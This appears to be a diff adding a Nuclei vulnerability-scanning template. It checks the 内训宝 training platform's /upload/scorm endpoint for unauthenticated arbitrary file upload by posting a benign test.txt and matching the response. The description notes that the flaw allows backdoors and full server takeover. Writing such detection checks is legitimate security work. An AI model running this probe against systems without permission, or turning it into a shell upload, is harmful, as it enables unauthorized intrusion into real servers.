@@ -1,0 +1,36 @@
+id: nxb-scorm-upload
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 内训宝企业培训平台 upload/scorm 接口存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%86%85%E8%AE%AD%E5%AE%9D%E7%A7%91%E6%8A%80/%E5%86%85%E8%AE%AD%E5%AE%9Dscorm%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        POST /upload/scorm HTTP/1.1
+        Host: {{Hostname}}
+        Referer: http://1.1.1.1
+        Content-Type: multipart/form-data; boundary=----w80tipyzy4xm9y5cb2zk
+        Content-Length: 197
+
+        ------w80tipyzy4xm9y5cb2zk
+        Content-Disposition: form-data; name="fileupload"; filename="test.txt"
+        Content-Type: application/octet-stream
+
+        123
+        ------w80tipyzy4xm9y5cb2zk--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '.txt'
+      - type: status
+        status:
+          - 200
